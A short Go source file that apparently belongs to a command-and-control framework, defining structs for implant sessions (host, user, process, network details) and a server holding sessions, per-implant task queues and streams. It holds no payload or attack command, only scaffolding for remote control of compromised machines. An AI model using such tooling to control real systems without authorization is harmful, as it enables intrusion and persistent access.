package shared

import (
	"sync"
	"time"
)

// Session represents an active implant session
type Session struct {
	ImplantID      string
	SessionToken   string
	Hostname       string
	Username       string
	OS            string
	Arch          string
	ProcessName   string
	PID           int32
	NetworkIfaces []string
	LastSeen      time.Time
	Created       time.Time
}

// C2Server represents the main server structure
type C2Server struct {
	// Active sessions
	Sessions     map[string]*Session
	SessionsMux  sync.RWMutex
	
	// Task queues per implant
	TaskQueues   map[string]chan interface{}
	QueuesMux    sync.RWMutex
	
	// Active streams for real-time communication
	Streams      map[string]interface{}
	StreamsMux   sync.RWMutex
}